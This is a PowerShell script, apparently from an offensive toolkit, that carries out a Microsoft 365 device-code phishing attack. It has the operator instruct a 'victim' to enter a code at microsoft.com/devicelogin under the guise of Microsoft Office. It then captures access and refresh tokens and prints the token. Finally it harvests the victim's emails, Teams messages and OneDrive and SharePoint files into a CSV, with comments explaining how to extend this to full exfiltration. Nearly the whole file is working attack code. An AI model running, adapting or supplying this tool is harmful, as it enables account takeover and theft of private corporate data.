# MSADPT_M365_DirectOAuth_ContentGrabber_V2.ps1
# Description: Implements a direct OAuth 2.0 Device Code flow in PowerShell to acquire
#              Microsoft Graph access tokens using a legitimate first-party Client ID (Microsoft Office).
#              It then enumerates M365 content (emails, Teams, SharePoint files) by making
#              direct HTTP calls to the Microsoft Graph API, mimicking GraphSpy's successful technique.
# Usage: Run the script, instruct the victim to enter the code at microsoft.com/devicelogin,
#        and then it will automatically poll for the token.

param(
    # Defaulting to Microsoft Office Client ID, as it has been proven to work with .default scope.
    [string]$ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c", # Microsoft Office
    [string]$TenantId = "common", # Use "common" for multi-tenant apps, or specify a tenant ID
    [string]$OutputCSV = "C:\temp\MSADPT_Output\MSADPT_M365_DirectOAuth_Content_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"
)

# --- MSADPT Core Logging Function ---
function Write-MSADPTLog {
    param(
        [string]$Message,
        [string]$Level = 'INFO' # INFO, WARNING, ERROR, COMMAND, TREASUREFOUND
    )
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogEntry = "[$Timestamp][$Level] $Message"
    Write-Host $LogEntry
    # In a full implementation, this would also write to a log file specified in MSADPT.config
}

Write-MSADPTLog -Message "MSADPT_M365_DirectOAuth_ContentGrabber_V2.ps1 started." -Level 'INFO'
Write-MSADPTLog -Message "Attempting direct OAuth 2.0 Device Code flow using Client ID: '$ClientId' (Microsoft Office)." -Level 'INFO'
Write-MSADPTLog -Message "Output will be saved to: $OutputCSV" -Level 'INFO'

# --- Pre-computation and user confirmation ---
Write-MSADPTLog -Message "This script will:
1. Initiate a Microsoft Graph device code authentication flow directly with Azure AD using raw HTTP requests. This bypasses the limitations encountered with 'Connect-MgGraph'.
2. The victim will be prompted to go to microsoft.com/devicelogin and enter a code. The consent prompt will appear to come from 'Microsoft Office'.
3. Poll Azure AD for the authentication token. If the victim consents to the requested permissions, an access token for Microsoft Graph will be acquired with broad scopes via the '.default' mechanism.
4. Decode the acquired JWT to inspect its permissions (scopes).
5. Use the acquired token to enumerate emails, Teams channels/messages, and SharePoint/OneDrive files by making direct Microsoft Graph API calls.
6. Log all findings and export discovered M365 content metadata to '$OutputCSV'." -Level 'INFO'

$proceed = Read-Host "Proceed to initiate M365 device code flow using first-party Client ID '$ClientId' via direct OAuth? (Y/N)"
if ($proceed -ne 'Y' -and $proceed -ne 'y') {
    Write-MSADPTLog -Message "User aborted the M365 content acquisition." -Level 'INFO'
    Exit
}

# Define the scopes including the crucial .default scope for Microsoft Graph.
# This leverages the pre-configured delegated permissions of the Microsoft Office application.
# 'openid' and 'offline_access' are standard for device code flows and refresh tokens.
$scopes = "https://graph.microsoft.com/.default openid offline_access"

Write-MSADPTLog -Message "Requested scopes: '$scopes'" -Level 'INFO'


function ConvertFrom-Base64Url {
	[CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline = $true)]
        [AllowNull()]
        [AllowEmptyString()]
        [string]$InputObject,

        [string]$LogFile,

        [switch]$ReturnBytes
    )

    begin {
        function Write-Log {
            param(
                [string]$Message,
                [string]$Level = 'INFO'
            )

            $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
            $logLine = "[$timestamp][$Level] $Message"

            Write-Verbose $logLine

            if ($LogFile) {
                try {
                    Add-Content -Path $LogFile -Value $logLine -ErrorAction SilentlyContinue
                }
                catch {
                    # Logging must never break execution
                }
            }
        }

        Write-Log "Base64Url decoder initialized"
    }

    process {
        $result = [PSCustomObject]@{
            Input   = $InputObject
            Output  = $null
            Success = $false
            Error   = $null
        }

        try {
            if ($null -eq $InputObject) {
                Write-Log "Null input received" "WARN"
                $result.Error = "Empty input"
                $result
                return
            }

            $workingValue = $InputObject.Trim()

            if ([string]::IsNullOrWhiteSpace($workingValue)) {
                Write-Log "Empty or whitespace input received" "WARN"
                $result.Error = "Empty input"
                $result
                return
            }

            Write-Log "Processing input of length $($workingValue.Length)"

            # Normalize Base64Url -> Base64
            $workingValue = $workingValue.Replace('-', '+').Replace('_', '/')

            # Fix padding safely
            switch ($workingValue.Length % 4) {
                2 { $workingValue += '==' }
                3 { $workingValue += '=' }
                1 { throw "Invalid Base64Url length" }
            }

            Write-Log "Normalized Base64 length: $($workingValue.Length)"

            $bytes = [Convert]::FromBase64String($workingValue)

            if ($ReturnBytes) {
                $result.Output = $bytes
            }
            else {
                $result.Output = [System.Text.Encoding]::UTF8.GetString($bytes)
            }

            $result.Success = $true
            Write-Log "Decoding successful"
        }
        catch {
            $result.Error = $_.Exception.Message
            $result.Success = $false
            Write-Log "Decoding failed: $($_.Exception.Message)" "ERROR"
        }

        $result
    }
}


try {
    # --- Step 1: Request Device Code ---
    Write-MSADPTLog -Message "Making initial request to Azure AD for device code..." -Level 'INFO'
    $deviceCodeUri = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/devicecode"
    $deviceCodeBody = @{
        client_id = $ClientId
        scope = $scopes
    }

    $deviceCodeResponse = Invoke-RestMethod -Uri $deviceCodeUri -Method Post -Body $deviceCodeBody -ErrorAction Stop

    $userCode = $deviceCodeResponse.user_code
    $verificationUri = $deviceCodeResponse.verification_uri
    $expiresIn = $deviceCodeResponse.expires_in
    $interval = $deviceCodeResponse.interval

    Write-MSADPTLog -Message "Instruct the victim to navigate to: $verificationUri" -Level 'COMMAND'
    Write-MSADPTLog -Message "And enter the code: $userCode" -Level 'COMMAND'
    Write-MSADPTLog -Message "Waiting for victim to authenticate and consent. This code expires in $($expiresIn / 60) minutes." -Level 'INFO'

    # --- Step 2: Poll for Token ---
    $tokenUri = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
    $tokenBody = @{
        client_id = $ClientId
        grant_type = "urn:ietf:params:oauth:grant-type:device_code"
        device_code = $deviceCodeResponse.device_code
    }

    $accessToken = $null
    $pollingStartTime = Get-Date

    while (!$accessToken -and ((Get-Date) - $pollingStartTime).TotalSeconds -lt $expiresIn) {
        Start-Sleep -Seconds $interval
        Write-MSADPTLog -Message "Polling for token..." -Level 'INFO'
        try {
            $tokenResponse = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $tokenBody -ErrorAction Stop
            $accessToken = $tokenResponse.access_token
            $refreshToken = $tokenResponse.refresh_token # Store for potential persistence
            $actualScopes = ($tokenResponse.scope -split ' ') # Actual scopes granted
            Write-MSADPTLog -Message "Successfully acquired access token!" -Level 'TREASUREFOUND'
            Write-MSADPTLog -Message "Actual granted scopes: $($actualScopes -join ', ')" -Level 'INFO'

            # --- Decode JWT for detailed scope inspection ---
            Write-MSADPTLog -Message "Decoding Access Token (JWT) to inspect claims..." -Level 'INFO'
            # Split the token into its parts (header, payload, signature)
            $jwtParts = $accessToken.Split('.')
            if ($jwtParts.Count -eq 3) {
                #$jwtHeader = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($jwtParts[0])) | ConvertFrom-Json
                #$jwtPayload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($jwtParts[1])) | ConvertFrom-Json
				
				Write-MSADPTLog -Message "accessToken type: $($accessToken.GetType().FullName)" -Level 'INFO'
				Write-MSADPTLog -Message "jwtParts type: $($jwtParts.GetType().FullName)" -Level 'INFO'
				Write-MSADPTLog -Message "jwtParts[0] type: $($jwtParts[0].GetType().FullName)" -Level 'INFO'
				Write-MSADPTLog -Message "jwtParts[1] type: $($jwtParts[1].GetType().FullName)" -Level 'INFO'
		
				$headerResult  = ConvertFrom-Base64Url $jwtParts[0]
				$payloadResult = ConvertFrom-Base64Url $jwtParts[1]

				if ($headerResult -and $payloadResult -and $headerResult.Success -and $payloadResult.Success -and $headerResult.Output -and $payloadResult.Output) {
					try {
						$jwtHeader  = $headerResult.Output  | ConvertFrom-Json
						#$jwtPayload = $payloadResult.Output | ConvertFrom-Json
					}
					catch {
						Write-MSADPTLog -Message "JWT JSON parsing failed: $($_.Exception.Message)" -Level 'ERROR'
						return
					}
					
					try {
						#$jwtHeader  = $headerResult.Output  | ConvertFrom-Json
						$jwtPayload = $payloadResult.Output | ConvertFrom-Json
					}
					catch {
						Write-MSADPTLog -Message "JWT JSON parsing failed: $($_.Exception.Message)" -Level 'ERROR'
						return
					}


					Write-MSADPTLog -Message "JWT decoded successfully" -Level 'INFO'

					Write-MSADPTLog -Message "  JWT Header: $($jwtHeader | ConvertTo-Json -Depth 5)" -Level 'INFO'
					Write-MSADPTLog -Message "  JWT Payload: $($jwtPayload | ConvertTo-Json -Depth 5)" -Level 'INFO'

					if ($jwtPayload.aud) { Write-MSADPTLog -Message "    JWT Audience (aud): $($jwtPayload.aud)" -Level 'INFO' }
					if ($jwtPayload.scp) { Write-MSADPTLog -Message "    JWT Scopes (scp): $($jwtPayload.scp)" -Level 'INFO' }
					if ($jwtPayload.appid) { Write-MSADPTLog -Message "    JWT App ID (appid): $($jwtPayload.appid)" -Level 'INFO' }

					if ($jwtPayload.upn) {
						Write-MSADPTLog -Message "    JWT User Principal Name (upn): $($jwtPayload.upn)" -Level 'INFO'
					}
					elseif ($jwtPayload.preferred_username) {
						Write-MSADPTLog -Message "    JWT User Principal Name (upn): $($jwtPayload.preferred_username)" -Level 'INFO'
					}

				} else {
					Write-MSADPTLog -Message "JWT decode failed (Base64URL issue)" -Level 'ERROR'
					return
				}
				
                Write-MSADPTLog -Message "  JWT Header: $($jwtHeader | ConvertTo-Json -Depth 5)" -Level 'INFO'
                Write-MSADPTLog -Message "  JWT Payload: $($jwtPayload | ConvertTo-Json -Depth 5)" -Level 'INFO'
                
                # Extract and log specific claims for verification
                if ($jwtPayload.aud) { Write-MSADPTLog -Message "    JWT Audience (aud): $($jwtPayload.aud)" -Level 'INFO' }
                if ($jwtPayload.scp) { Write-MSADPTLog -Message "    JWT Scopes (scp): $($jwtPayload.scp)" -Level 'INFO' }
                if ($jwtPayload.appid) { Write-MSADPTLog -Message "    JWT App ID (appid): $($jwtPayload.appid)" -Level 'INFO' }
                if ($jwtPayload.upn) { Write-MSADPTLog -Message "    JWT User Principal Name (upn): $($jwtPayload.upn)" -Level 'INFO' }
				elseif ($jwtPayload.preferred_username) { Write-MSADPTLog -Message "    JWT User Principal Name (upn): $($jwtPayload.preferred_username)" -Level 'INFO'  }
            } else {
                Write-MSADPTLog -Message "  Could not decode JWT: Invalid format." -Level 'WARNING'
            }
            # --- End JWT decoding ---

        }
        catch {
			# Capture the original outer error record immediately so nested catch blocks
			# don't overwrite $_
			$outerError = $_

			# Default fallback object
			$errorDetails = [PSCustomObject]@{
				error             = 'unknown'
				error_description = $outerError.Exception.Message
				raw_body          = $null
				status_code       = $null
			}

			$responseBody = $null

			# Try to capture status code if present
			try {
				if ($null -ne $outerError.Exception.Response -and
					$null -ne $outerError.Exception.Response.StatusCode) {

					# Handles enum-like StatusCode objects safely
					$errorDetails.status_code = [int]$outerError.Exception.Response.StatusCode
				}
			}
			catch {
				# Ignore status-code extraction errors
			}

			# First preference: ErrorDetails.Message if PowerShell populated it
			if (-not [string]::IsNullOrWhiteSpace($outerError.ErrorDetails.Message)) {
				$responseBody = $outerError.ErrorDetails.Message
			}
			else {
				# Second preference: try reading HttpResponseMessage content if present
				try {
					if ($null -ne $outerError.Exception.Response -and
						$null -ne $outerError.Exception.Response.Content) {

						$responseBody = $outerError.Exception.Response.Content.ReadAsStringAsync().GetAwaiter().GetResult()
					}
				}
				catch {
					# Ignore response body extraction errors
				}
			}

			# Preserve raw body if we got anything at all
			if (-not [string]::IsNullOrWhiteSpace($responseBody)) {
				$errorDetails.raw_body = $responseBody

				# Only try JSON parsing if it actually looks like JSON
				$trimmed = $responseBody.Trim()
				if ($trimmed.StartsWith('{') -or $trimmed.StartsWith('[')) {
					try {
						$parsed = $trimmed | ConvertFrom-Json -ErrorAction Stop

						# Normalize into a predictable shape
						$errorDetails = [PSCustomObject]@{
							error             = if ($parsed.PSObject.Properties.Name -contains 'error') { $parsed.error } else { 'unknown' }
							error_description = if ($parsed.PSObject.Properties.Name -contains 'error_description') { $parsed.error_description } else { $outerError.Exception.Message }
							raw_body          = $responseBody
							status_code       = $errorDetails.status_code
						}
					}
					catch {
						# Leave fallback object in place, but keep raw_body
						$errorDetails.error_description = "Non-parseable JSON error body. Original message: $($outerError.Exception.Message)"
					}
				}
				else {
					# Not JSON; preserve as plain text
					$errorDetails.error_description = $responseBody
				}
			}

			# Example downstream handling
			if ($errorDetails.error -in @('authorization_pending', 'slow_down')) {
				# keep polling
			}
			elseif ($errorDetails.error -eq 'access_denied') {
				Write-MSADPTLog -Message "User denied access or cancelled." -Level 'ERROR'
				Exit
			}
			elseif ($errorDetails.error -eq 'expired_token') {
				Write-MSADPTLog -Message "Device code expired." -Level 'ERROR'
				Exit
			}
			else {
				Write-MSADPTLog -Message "Unexpected token polling error: $($errorDetails.error_description)" -Level 'ERROR'
				Exit
			}
		}
    }

    if (!$accessToken) {
        Write-MSADPTLog -Message "Failed to acquire access token within the allowed time. Device code expired." -Level 'ERROR'
        Exit
    }else{
		Write-Host $accessToken
	}

    # --- Step 3: Use Access Token for Microsoft Graph API Calls ---
    $graphHeaders = @{
        Authorization = "Bearer $accessToken"
        "Content-Type" = "application/json"
    }

    # Get authenticated user's profile to get ObjectId
    Write-MSADPTLog -Message "Retrieving authenticated user's profile..." -Level 'INFO'
    try {
        $userProfile = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $graphHeaders -ErrorAction Stop
        $currentUserObjectId = $userProfile.id
        $currentUserPrincipalName = $userProfile.userPrincipalName
        Write-MSADPTLog -Message "Authenticated as: $currentUserPrincipalName (ID: $currentUserObjectId)" -Level 'INFO'
    }
    catch {
        Write-MSADPTLog -Message "ERROR: Failed to retrieve user profile. This could indicate insufficient 'User.Read' scope or an invalid token. $($_.Exception.Message)" -Level 'ERROR'
        Exit
    }

    $results = @()

    # --- Enumerate Emails ---
    Write-MSADPTLog -Message "Attempting to list recent emails for $currentUserPrincipalName..." -Level 'INFO'
    try {
        # Graph API call for user messages. Using -Top to limit results for quick PoC. For full exfil, remove -Top or use pagination.
        $mailResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages?`$top=5&`$select=subject,from,receivedDateTime,hasAttachments" -Headers $graphHeaders -ErrorAction Stop
        foreach ($msg in $mailResponse.value) {
            $results += [PSCustomObject]@{
                Category = "Email"
                Item = "Message"
                Subject = $msg.subject
                Sender = $msg.from.emailAddress.address
                Received = $msg.receivedDateTime
                HasAttachments = $msg.hasAttachments
                SourceUser = $currentUserPrincipalName
                Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            }
            Write-MSADPTLog -Message "  Found Email: Subject: '$($msg.subject)' from '$($msg.from.emailAddress.address)'" -Level 'TREASUREFOUND'
        }
    }
    catch {
        Write-MSADPTLog -Message "WARNING: Could not list emails. Possible scope issue or no mail access for this user. $($_.Exception.Message)" -Level 'WARNING'
    }

    # --- Enumerate Teams Channels and Messages ---
    Write-MSADPTLog -Message "Attempting to list joined Teams and their channels for $currentUserPrincipalName..." -Level 'INFO'
    try {
        # Graph API call for joined teams. Limiting for PoC.
        $teamsResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/joinedTeams?`$top=2" -Headers $graphHeaders -ErrorAction Stop
        foreach ($team in $teamsResponse.value) {
            Write-MSADPTLog -Message "  Processing Team: $($team.DisplayName) (ID: $($team.Id))" -Level 'INFO'
            
            # Graph API call for channels in team. Limiting for PoC.
            $channelsResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/teams/$($team.Id)/channels?`$top=2" -Headers $graphHeaders -ErrorAction Stop
            foreach ($channel in $channelsResponse.value) {
                $results += [PSCustomObject]@{
                    Category = "Teams"
                    Item = "Channel"
                    TeamName = $team.DisplayName
                    ChannelName = $channel.DisplayName
                    ChannelId = $channel.Id
                    SourceUser = $currentUserPrincipalName
                    Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                }
                Write-MSADPTLog -Message "    Found Channel: $($channel.DisplayName) in Team $($team.DisplayName)" -Level 'TREASUREFOUND'

                # Get a few recent messages from the channel. Limiting for PoC.
                try {
                    $messagesUri = "https://graph.microsoft.com/v1.0/teams/$($team.Id)/channels/$($channel.Id)/messages?`$top=3&`$select=body,from,createdDateTime"
                    $channelMessagesResponse = Invoke-RestMethod -Uri $messagesUri -Headers $graphHeaders -ErrorAction Stop
                    foreach ($msg in $channelMessagesResponse.value) {
                        $results += [PSCustomObject]@{
                            Category = "Teams"
                            Item = "Message"
                            TeamName = $team.DisplayName
                            ChannelName = $channel.DisplayName
                            Sender = $msg.from.user.displayName
                            SentDateTime = $msg.createdDateTime
                            #MessageSnippet = ($msg.body.content | Select-Object -ExpandProperty Content | Select-Object -First 100)
							MessageSnippet = if ($msg.body.content) {
								$msg.body.content.Substring(0, [Math]::Min(100, $msg.body.content.Length))
							} else { "" }
                            SourceUser = $currentUserPrincipalName
                            Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                        }
                        Write-MSADPTLog -Message "      Found Teams Message from $($msg.from.user.displayName) in Channel $($channel.DisplayName)" -Level 'TREASUREFOUND'
                    }
                }
                catch {
                    Write-MSADPTLog -Message "      WARNING: Could not list messages for channel $($channel.DisplayName). Check granted scopes or if the channel has messages. $($_.Exception.Message)" -Level 'WARNING'
                }
            }
        }
    }
    catch {
        Write-MSADPTLog -Message "WARNING: Could not list Teams or channels. Possible scope issue or no Teams access for this user. $($_.Exception.Message)" -Level 'WARNING'
    }

    # --- Enumerate SharePoint/OneDrive Files ---
    Write-MSADPTLog -Message "Attempting to list SharePoint/OneDrive files for $currentUserPrincipalName..." -Level 'INFO'
    try {
        # List user's OneDrive files. Limiting for PoC.
        $driveItemsResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/root/children?`$top=5" -Headers $graphHeaders -ErrorAction Stop
        foreach ($item in $driveItemsResponse.value) {
            $results += [PSCustomObject]@{
                Category = "OneDrive"
                Item = "File"
                FileName = $item.name
                WebUrl = $item.webUrl
                Size = $item.size
                SourceUser = $currentUserPrincipalName
                Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            }
            Write-MSADPTLog -Message "  Found OneDrive File: '$($item.name)' (URL: $($item.webUrl))" -Level 'TREASUREFOUND'
        }

        # List some SharePoint sites and their document libraries. Limiting for PoC.
        $sitesResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/sites?`$top=2" -Headers $graphHeaders -ErrorAction Stop
        foreach ($site in $sitesResponse.value) {
            Write-MSADPTLog -Message "  Processing SharePoint Site: $($site.DisplayName) (URL: $($site.WebUrl))" -Level 'INFO'
            
            # List drives (document libraries) within the site. Limiting for PoC.
            try {
                $drivesResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/sites/$($site.Id)/drives?`$top=1" -Headers $graphHeaders -ErrorAction Stop
                foreach ($drive in $drivesResponse.value) {
                    Write-MSADPTLog -Message "    Processing Drive: $($drive.Name) (ID: $($drive.Id)) in Site $($site.DisplayName)" -Level 'INFO'

                    # List files within the drive. Limiting for PoC.
                    try {
                        $driveFilesResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/sites/$($site.Id)/drives/$($drive.Id)/root/children?`$top=3" -Headers $graphHeaders -ErrorAction Stop
                        foreach ($file in $driveFilesResponse.value) {
                            $results += [PSCustomObject]@{
                                Category = "SharePoint"
                                Item = "File"
                                SiteName = $site.DisplayName
                                DriveName = $drive.Name
                                FileName = $file.name
                                WebUrl = $file.webUrl
                                Size = $file.size
                                SourceUser = $currentUserPrincipalName
                                Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                            }
                            Write-MSADPTLog -Message "      Found SharePoint File: '$($file.name)' in Site '$($site.DisplayName)' Drive '$($drive.Name)'" -Level 'TREASUREFOUND'
                        }
                    }
                    catch {
                        Write-MSADPTLog -Message "      WARNING: Could not list files for Drive $($drive.Name) in Site $($site.DisplayName). $($_.Exception.Message)" -Level 'WARNING'
                    }
                }
            }
            catch {
                Write-MSADPTLog -Message "    WARNING: Could not list drives for Site $($site.DisplayName). Possible scope issue or no drives found. $($_.Exception.Message)" -Level 'WARNING'
            }
        }
    }
    catch {
        Write-MSADPTLog -Message "WARNING: Could not list SharePoint/OneDrive files. Possible scope issue or no file access for this user. $($_.Exception.Message)" -Level 'WARNING'
    }

    # --- Export Results ---
    if ($results.Count -gt 0) {
        # Ensure the output directory exists
        $OutputDirectory = Split-Path -Path $OutputCSV -Parent
        if (-not (Test-Path -Path $OutputDirectory)) {
            New-Item -ItemType Directory -Path $OutputDirectory -Force | Out-Null
            Write-MSADPTLog -Message "Created output directory: $OutputDirectory" -Level 'INFO'
        }
        $results | Export-Csv -Path $OutputCSV -NoTypeInformation -Force
        Write-MSADPTLog -Message "Successfully enumerated M365 content. Details saved to '$OutputCSV'." -Level 'INFO'
    } else {
        Write-MSADPTLog -Message "No M365 content found or enumerated based on granted scopes." -Level 'INFO'
    }
}
catch {
    Write-MSADPTLog -Message "CRITICAL ERROR during M365 Direct OAuth operation: $($_.Exception.Message)." -Level 'ERROR'
    Write-MSADPTLog -Message "This could indicate an issue with the Client ID, Azure AD policies, network connectivity, or an unexpected Graph API error." -Level 'ERROR'
    Write-MSADPTLog -Message "Please ensure the victim completed the device code authentication and consent process successfully." -Level 'ERROR'
}

Write-MSADPTLog -Message "MSADPT_M365_DirectOAuth_ContentGrabber_V2.ps1 finished." -Level 'INFO'

